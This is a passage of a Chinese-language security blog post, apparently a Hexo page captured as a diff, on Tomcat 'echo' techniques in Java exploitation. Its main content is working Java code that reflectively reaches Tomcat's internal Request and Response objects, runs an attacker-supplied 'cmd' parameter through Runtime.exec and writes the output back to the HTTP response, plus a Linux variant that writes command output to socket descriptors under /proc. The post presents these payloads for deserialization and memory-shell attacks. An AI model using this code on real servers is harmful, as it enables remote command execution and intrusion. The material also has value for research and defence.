class="line">        handlers = &#123;java.util.concurrent.CopyOnWriteArrayList&#125;  size = <span class="number">2</span> <span class="comment">//[!]</span></span><br><span class="line">         <span class="number">0</span> = &#123;org.apache.juli.FileHandler&#125; </span><br><span class="line">          date = <span class="string">&quot;2021-12-09&quot;</span></span><br><span class="line">          directory = <span class="string">&quot;C:\Users\e\AppData\Local\JetBrains\IntelliJIdea2021.2\tomcat\2b72dbbd-2f54-48a6-9ed1-18ebe03347fa/logs&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么，我们也可以通过写文件的方式，写入到 ？？？？？</p>
+<p>Adpter是启动时就已经设置好了的</p>
+<h2 id="Tomcat7-另一个静态变量"><a href="#Tomcat7-另一个静态变量" class="headerlink" title="* Tomcat7 另一个静态变量"></a>* Tomcat7 另一个静态变量</h2><p>李三师傅提出来的。原文：<a target="_blank" rel="noopener" href="http://redteam.today/2020/04/09/tomcat%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E8%BF%9E%E7%BB%AD%E5%89%A7%E7%AC%AC%E5%85%AD%E9%9B%86/">tomcat不出网回显连续剧第六集</a></p>
+<p>这个相对于全局存储来说，还是比较好理解的哈哈哈。毕竟一个反射全解决了。</p>
+<p>Tomcat对<code>processor</code>进行<code>register()</code>的操作和Tomcat8不太一样。具体代码在<code>Http11Protocol#createProcessor()</code>。其中有调用 *Http11Protocol#register()*的操作</p>
+<p>在*Http11Protocol#register()*中。有下面这么一行。将<code>rp</code>丢进了<code>registerComponent()</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Registry.getRegistry(<span class="keyword">null</span>, <span class="keyword">null</span>).registerComponent(rp, rpName, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>
+
+<p>很明显的看到<code>Registry.getRegistry(null, null)</code>是一个静态调用。跟进去可以发现。其返回的就是<code>Registry.registry</code>静态属性。</p>
+<p>那，如果接下来的<code>registerComponent()</code>逻辑中有将<code>rp</code>存入<code>Registry.registry</code>或其引用的类中，那么就可以通过<code>Registry.getRegistry(null, null)</code>静态调用，在Tomcat任意位置取到<code>response</code>了。下面我们要找的是在何处存储了<code>rp</code>。</p>
+<p>跟进<code>registerComponent()</code>，可以找到将<code>RequestInfo rp</code>设置到静态变量的代码。调用栈如下：</p>
+<p><em>寻找存储点的思路：高亮显示要被的变量<code>rp</code>，发现哪个方法有传入该变量，跟进分析</em></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">addMoiToTb:<span class="number">278</span>, Repository</span><br><span class="line">addMBean:<span class="number">440</span>, Repository</span><br><span class="line">registerWithRepository:<span class="number">1898</span>, DefaultMBeanServerInterceptor</span><br><span class="line">registerDynamicMBean:<span class="number">966</span>, DefaultMBeanServerInterceptor</span><br><span class="line">registerObject:<span class="number">900</span>, DefaultMBeanServerInterceptor</span><br><span class="line">registerMBean:<span class="number">324</span>, DefaultMBeanServerInterceptor</span><br><span class="line">registerMBean:<span class="number">522</span>, JmxMBeanServer</span><br><span class="line">registerComponent:<span class="number">749</span>, Registry</span><br><span class="line">register:<span class="number">272</span>, Http11Protocol$Http11ConnectionHandler</span><br></pre></td></tr></table></figure>
+
+<p>最终在*Repository#addMoiToTb()*进行了存储操作。存入的是一个<code>map</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addMoiToTb</span><span class="params">(<span class="keyword">final</span> DynamicMBean object,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">final</span> ObjectName name,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">final</span> String key,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">final</span> Map&lt;String,NamedObject&gt; moiTb,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">final</span> RegistrationContext context)</span> </span>&#123;</span><br><span class="line">    registering(context);</span><br><span class="line">    moiTb.put(key,<span class="keyword">new</span> NamedObject(name, object));<span class="comment">//存储操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>变量内容如下，我们需要用循环+判断，获取<code>RequestGroupInfo</code>类型的元素:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">moiTb = &#123;java.util.HashMap@<span class="number">2764</span>&#125;  size = <span class="number">37</span></span><br><span class="line"> <span class="string">&quot;name=&quot;</span>ajp-bio-<span class="number">8009</span><span class="string">&quot;,type=GlobalRequestProcessor&quot;</span></span><br><span class="line">  key = <span class="string">&quot;name=&quot;</span>ajp-bio-<span class="number">8009</span><span class="string">&quot;,type=GlobalRequestProcessor&quot;</span></span><br><span class="line">  value = &#123;com.sun.jmx.mbeanserver.NamedObject@<span class="number">2822</span>&#125; </span><br><span class="line">   name = &#123;javax.management.ObjectName@<span class="number">2902</span>&#125; </span><br><span class="line">   object = &#123;org.apache.tomcat.util.modeler.BaseModelMBean@<span class="number">2903</span>&#125; </span><br><span class="line">    ....</span><br><span class="line">    resource = &#123;org.apache.coyote.RequestGroupInfo@<span class="number">2910</span>&#125;  <span class="comment">//存在response的类型为RequestGroupInfo</span></span><br><span class="line">    resourceType = <span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span></span><br><span class="line">    </span><br><span class="line"> <span class="string">&quot;type=StringCache&quot;</span> -&gt; &#123;com.sun.jmx.mbeanserver.NamedObject@<span class="number">2824</span>&#125; </span><br><span class="line">  key = <span class="string">&quot;type=StringCache&quot;</span></span><br><span class="line">  value = &#123;com.sun.jmx.mbeanserver.NamedObject@<span class="number">2824</span>&#125; </span><br><span class="line">   name = &#123;javax.management.ObjectName@<span class="number">2904</span>&#125; </span><br><span class="line">   object = &#123;org.apache.tomcat.util.modeler.BaseModelMBean@<span class="number">2905</span>&#125; </span><br><span class="line">	.....</span><br><span class="line">    resource = &#123;org.apache.tomcat.util.buf.StringCache@<span class="number">2907</span>&#125; <span class="comment">//别的都是其他类型</span></span><br><span class="line">    resourceType = <span class="string">&quot;org.apache.tomcat.util.buf.StringCache&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>获取<code>RequestGroupInfo</code>的存储链如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">org.apache.tomcat.util.modeler.Registry.registry</span><br><span class="line">-&gt; server</span><br><span class="line">    -&gt; mbsInterceptor</span><br><span class="line">    	-&gt; repository</span><br><span class="line">    		-&gt; domainTb</span><br><span class="line">    			-&gt; <span class="string">&quot;Catalina&quot;</span></span><br><span class="line">    				-&gt; <span class="string">&quot;name=\&quot;ajp-bio-8009\&quot;,type=GlobalRequestProcessor&quot;</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">org.apache.tomcat.util.modeler.Registry.registry.getMBeanServer()</span></span><br><span class="line"><span class="comment">反射拿mbsInterceptor</span></span><br><span class="line"><span class="comment">反射拿repository</span></span><br><span class="line"><span class="comment">反射拿domainTb</span></span><br><span class="line"><span class="comment">操作Map domainTb，拿`Catalina`的值</span></span><br><span class="line"><span class="comment">`Catalina`也是一个Map。遍历找到`RequestGroupInfo`类型，这就是存在response的对象</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">MBeanServer mBeanServer = Registry.getRegistry(<span class="keyword">null</span>, <span class="keyword">null</span>).getMBeanServer();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Field mbsInterceptorField = mBeanServer.getClass().getDeclaredField(<span class="string">&quot;mbsInterceptor&quot;</span>);</span><br><span class="line">    mbsInterceptorField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object mbsInterceptor = mbsInterceptorField.get(mBeanServer);</span><br><span class="line"></span><br><span class="line">    Field repositoryField = mbsInterceptor.getClass().getDeclaredField(<span class="string">&quot;repository&quot;</span>);</span><br><span class="line">    repositoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object repository = repositoryField.get(mbsInterceptor);</span><br><span class="line"></span><br><span class="line">    Field domainTbField = repository.getClass().getDeclaredField(<span class="string">&quot;domainTb&quot;</span>);</span><br><span class="line">    domainTbField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map&lt;String,Map&lt;String, NamedObject&gt;&gt; domainTb = (Map) domainTbField.get(repository);</span><br><span class="line">    Map&lt;String, NamedObject&gt; catalina = domainTb.get(<span class="string">&quot;Catalina&quot;</span>);</span><br><span class="line">    Set&lt;String&gt; set = catalina.keySet();</span><br><span class="line">    <span class="keyword">for</span> (String key : set) &#123;</span><br><span class="line">        NamedObject namedObject = catalina.get(key);</span><br><span class="line">        <span class="comment">//一层层判断下去，防止报错</span></span><br><span class="line">        <span class="keyword">if</span>(namedObject.getObject().getClass().isAssignableFrom(BaseModelMBean.class))&#123;</span><br><span class="line">            BaseModelMBean baseModelMBean = (BaseModelMBean) namedObject.getObject();</span><br><span class="line">            <span class="keyword">if</span> (baseModelMBean.getManagedResource().getClass().isAssignableFrom(RequestGroupInfo.class)) &#123;</span><br><span class="line">                RequestGroupInfo requestGroupInfo = (RequestGroupInfo) baseModelMBean.getManagedResource();</span><br><span class="line">                <span class="comment">//判断下processors数量，有的是0，不是我们要找的</span></span><br><span class="line">                Field processorsField = requestGroupInfo.getClass().getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                processorsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ArrayList&lt;RequestInfo&gt; processors = (ArrayList) processorsField.get(requestGroupInfo);</span><br><span class="line">                <span class="keyword">for</span> (RequestInfo processor : processors) &#123;</span><br><span class="line">                    <span class="comment">//全部reponse都打上回显吧。免得有些回显不到</span></span><br><span class="line">                    Field reqField = processor.getClass().getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                    reqField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Request req = (Request) reqField.get(processor);</span><br><span class="line">                    Response response = req.getResponse();</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">//Tomcat8 之后，OutputBuffer没法获取了。只能通过强行发射来拿</span></span><br><span class="line">                    OutputBuffer outputBuffer = response.getOutputBuffer();</span><br><span class="line">                    <span class="comment">//Field outputBufferFiled = response.getClass().getDeclaredField(&quot;outputBuffer&quot;);</span></span><br><span class="line">                    <span class="comment">//outputBufferFiled.setAccessible(true);</span></span><br><span class="line">                    <span class="comment">//OutputBuffer outputBuffer = (OutputBuffer) outputBufferFiled.get(response);</span></span><br><span class="line">                    </span><br><span class="line">                    ByteChunk byteChunk = <span class="keyword">new</span> ByteChunk();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//根据请求,命令执行和回显</span></span><br><span class="line">                    String cmd = req.getParameters().getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                    String echoEnable = req.getParameters().getParameter(<span class="string">&quot;echoEnable&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="string">&quot;true&quot;</span>.equals(echoEnable) &amp;&amp; cmd != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        InputStream execInputStream = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                        BufferedInputStream bufferedInputStream = <span class="keyword">new</span> BufferedInputStream(execInputStream);</span><br><span class="line">                        <span class="comment">//1Mb一段读取</span></span><br><span class="line">                        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                        <span class="keyword">int</span> len;</span><br><span class="line">                        <span class="keyword">while</span>((len = bufferedInputStream.read(buffer)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                            byteChunk.append(buffer, <span class="number">0</span>, len);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">//Tomcat7 这样</span></span><br><span class="line">                        outputBuffer.doWrite(byteChunk, response);</span><br><span class="line">                        <span class="comment">//Tomcat8 用这样的格式</span></span><br><span class="line">                        <span class="comment">//outputBuffer.doWrite(byteChunk);</span></span><br><span class="line">                        bufferedInputStream.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><em><strong>ps：回显不太稳定，有一小部分时间会没有回显。估计和Tomcat的多线程有关。多刷新几次又出来了</strong></em></p>
+<p>这里可以注意下。最终response的输出是调用<code>doWrite(ByteBuffer chunk)</code>的。其中有这么一段</p>
+<p><em>ChunkedOutputFilter#doWrite()</em></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> result = chunk.remaining();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (result &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
+
+<p>跟进<code>chunk.remaining();</code>，能看到这样的光景：</p>
+<p><em>Buffer#remaining()</em></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">remaining</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rem = limit - position;</span><br><span class="line">    <span class="keyword">return</span> rem &gt; <span class="number">0</span> ? rem : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们在进行<code>ByteBuffer.put()</code>以后，需要让字节指针归位。不然<code>Buffer#remaining()</code>返回<code>0</code></p>
+<p>适配多版本的思路是：不同版本，有些方法参数不一样，包名不一样。我们可以通过反射来“相对动态”地调用。并加入try-catch。如果方法不存在，就说明当前Tomcat是其他版本</p>
+<h2 id="ClassLoader拿Context"><a href="#ClassLoader拿Context" class="headerlink" title="* ClassLoader拿Context"></a>* ClassLoader拿Context</h2><p>作为一个技巧，Tomcat中<code>Servlet</code>的<code>ClassLoader</code>是<code>ParallelWebappClassLoader</code>。所以只要拿到<code>Servlet.class.getClassLoader</code>，就能拿到<code>ParallelWebappClassLoader</code>。在<code>ParallelWebappClassLoader</code>中可以通过<code>ParallelWebappClassLoader.resources.context</code>拿到<code>Context</code>，这样，内存马啊回显啊都能搞定了。</p>
+<p><code>Thread.currentThread().getContextClassLoader()</code>可获得当前线程的<code>ClassLoader()</code>，如果该代码写在<code>Servlet</code>中或是由<code>Servlet</code>触发的话，<code>ClassLoader</code>是<code>ParallelWebappClassLoader</code></p>
+<p>通过<code>ParallelWebappClassLoader.resources.context</code>拿到的<code>Context</code>是<code>StandardContext</code>的实例。对于回显来说，从<code>StandardContext</code>拿到真正的<code>Request</code>的路径如下:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.service.connectors.0.protocolHandler.handler.global.processors</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="getServletContext"><a href="#getServletContext" class="headerlink" title="* getServletContext()"></a>* getServletContext()</h2><p>在Servlet下，可以通过直接调用<code>getServletContext()</code>，获取<code>ServletContext</code>。<code>ServletContext</code>的类型是<code>ApplicationContextFacade</code>。该类型可以通过<code>context.context</code>获取<code>StandardContext</code>。从<code>StandardContext</code>获取到<code>Request</code>的路径上文有说。</p>
+<h2 id="NioEndpoint"><a href="#NioEndpoint" class="headerlink" title="* NioEndpoint"></a>* NioEndpoint</h2><p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1549">木头师傅</a>提到的，感觉是很通用的方法。由于上文”ClassLoader拿Context”和”getServletContext()”无法在Tocmat7下使用（Tomcat7结构不同）。木头师傅找到了<code>NioEndpoint </code>类，该类的抽象父类<code>AbstractEndpoint</code>中存放着<code>handler</code>。<code>NioEndpoint</code>是<code>socket NIO poller</code>线程的主模块。可以通过遍历线程获取到<code> NioEndpoint$Poller</code>，再获取其父类<code>NioEndpoint</code>。直接得到<code>handler.global.processors</code>的路径以获取Request。</p>
+<p>大概的代码如下，懒得测了，回显马也不常用了233,,,</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Field threadsFields = threadGroup.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">threadsFields.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Thread[] threads = (Thread[]) threadsFields.get(threadGroup);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">    <span class="keyword">if</span> (thread != <span class="keyword">null</span> &amp;&amp; thread.getName().contains(<span class="string">&quot;http&quot;</span>) &amp;&amp; thread.getName().contains(<span class="string">&quot;exec&quot;</span>)) &#123;</span><br><span class="line">        Field targetField = java.lang.Thread.class.getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">        targetField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object target = targetField.get(thread);</span><br><span class="line">        .....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Mapper"><a href="#Mapper" class="headerlink" title="Mapper"></a>Mapper</h2><p>翻Tomcat处理路由这一块逻辑时看到的，虚拟主机的Map类<code>MappedHost</code>是一个静态类，其成员<code>contextList</code>和<code>object</code>中存在<code>Context</code>。具体的反射拿还没试，应该是可以的。走的还是前文”ClassLoader拿Context”的老路</p>
+<h2 id="Linux下Tomcat回显-不通用"><a href="#Linux下Tomcat回显-不通用" class="headerlink" title="Linux下Tomcat回显 - 不通用"></a>Linux下Tomcat回显 - 不通用</h2><p>思路：找socket描述符，没法确定是哪一个就依次<code>write()</code>，总会找到能<code>write()</code>的那个。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//have no request &amp; response args. Only execute command by fixed</span></span><br><span class="line"><span class="comment">//cmd</span></span><br><span class="line">InputStream cmdin = Runtime.getRuntime().exec(<span class="string">&quot;ip a&quot;</span>).getInputStream();</span><br><span class="line">String cmdRes = <span class="keyword">new</span> String(readBytesFromInputStream(cmdin, <span class="number">1024</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过ManagementFactory.getRuntimeMXBean()找Tomcat的PID</span></span><br><span class="line">String name = ManagementFactory.getRuntimeMXBean().getName();</span><br><span class="line">System.out.println(<span class="string">&quot;Runtime: &quot;</span> + name);</span><br><span class="line"><span class="comment">//切割，拿PID</span></span><br><span class="line">String pid = name.split(<span class="string">&quot;@&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">String path = <span class="string">&quot;/proc/&quot;</span> + pid + <span class="string">&quot;/fd&quot;</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;path: &quot;</span> + path);</span><br><span class="line"></span><br><span class="line"><span class="comment">//fetch所有的fd socket文件描述符</span></span><br><span class="line">String[] cmd = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;ls -l &quot;</span> + path + <span class="string">&quot; | grep socket:&quot;</span>&#125;;</span><br><span class="line">InputStream inputStream6 = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"><span class="keyword">byte</span>[] bytes6 = readBytesFromInputStream(inputStream6, <span class="number">1024</span>);</span><br><span class="line">String socketFilesString = <span class="keyword">new</span> String(bytes6);</span><br><span class="line"></span><br><span class="line"><span class="comment">//split by line and fetch one by one</span></span><br><span class="line">String[] socketFilesArr = socketFilesString.split(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (String socketFile : socketFilesArr) &#123;</span><br><span class="line">    String stringLeft = socketFile.split(<span class="string">&quot; -&gt;&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">    String[] socketDescriptorArr = stringLeft.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    String socketDescriptor = socketDescriptorArr[socketDescriptorArr.length - <span class="number">1</span>];</span><br><span class="line">    <span class="comment">//compent the path</span></span><br><span class="line">    String socketDescriptorPath = path + <span class="string">&quot;/&quot;</span> + socketDescriptor;</span><br><span class="line">    System.out.println(socketDescriptorPath);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Constructor&lt;FileDescriptor&gt; fileDescriptorConstructor = FileDescriptor.class.getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;<span class="keyword">int</span>.class&#125;);</span><br><span class="line">        fileDescriptorConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        FileDescriptor fileDescriptor = fileDescriptorConstructor.newInstance(Integer.parseInt(socketDescriptor));</span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(fileDescriptor);</span><br><span class="line"></span><br><span class="line">        fileOutputStream.write((<span class="string">&quot;HTTP/1 200 OK\r\n\r\n&quot;</span> + cmdRes + <span class="string">&quot;\r\n\r\n&quot;</span>).getBytes());</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] &quot;</span> + socketDescriptorPath);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>效果</p>
+<img src="/2022/07/07/2022-07-07-java-echo/2.png" style="zoom: 67%;">
+
+<p>并发太多，容易烂掉</p>
+<img src="/2022/07/07/2022-07-07-java-echo/1.png" style="zoom: 67%;">
+
+
+
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/0fWSp71yuaxL_TkZV65EwQ">Java回显综述</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.00theway.org/2020/01/17/java-god-s-eye/">通杀漏洞利用回显方法-linux平台</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7307">linux下java反序列化通杀回显方法的低配版实现</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/SGxpWPrEm4dAi7uEcP8EKQ">Tomcat中一种半通用回显方法</a></p>
+<p><a target="_blank" rel="noopener" href="http://redteam.today/2020/04/09/tomcat%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E8%BF%9E%E7%BB%AD%E5%89%A7%E7%AC%AC%E5%85%AD%E9%9B%86/">tomcat不出网回显连续剧第六集</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a></p>
+<p><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man5/proc.5.html">https://man7.org/linux/man-pages/man5/proc.5.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/java/" rel="tag"># java</a>
+          
+            <a href="/tags/Tomcat/" rel="tag"># Tomcat</a>
+          
+            <a href="/tags/RMI/" rel="tag"># RMI</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/05/17/2022-05-17-cbc-byte-flipping-attack/" rel="next" title="CBC字节翻转">
+                <i class="fa fa-chevron-left"></i> CBC字节翻转
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/07/07/2022-07-07-java-path-variables/" rel="prev" title="关于path variables ;的解析及经典..;/的成因">
+                关于path variables ;的解析及经典..;/的成因 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
